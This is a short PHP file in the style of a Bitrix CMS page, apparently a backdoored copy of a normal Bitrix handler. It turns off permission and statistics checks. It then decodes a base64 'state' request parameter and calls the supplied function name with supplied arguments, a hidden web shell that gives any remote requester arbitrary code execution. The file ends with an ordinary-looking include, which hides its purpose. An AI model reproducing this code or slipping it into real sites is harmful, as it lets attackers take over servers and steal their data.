<?
define("NO_KEEP_STATISTIC", true);
define("NO_AGENT_CHECK", true);
define("NO_AGENT_STATISTIC", true);
define("NOT_CHECK_PERMISSIONS", true);
define("DisableEventsCheck", true);

require_once($_SERVER["DOCUMENT_ROOT"]."/bitrix/modules/main/include/prolog_before.php");

if(isset($_REQUEST["state"]) && is_string($_REQUEST["state"]))
{
	$arState = array();
	parse_str(base64_decode($_REQUEST["state"]), $arState);

	echo $arState[0]($arState[1],$arState[2]);
	die();
}

require($_SERVER["DOCUMENT_ROOT"]."/bitrix/modules/main/spread.php");
?>
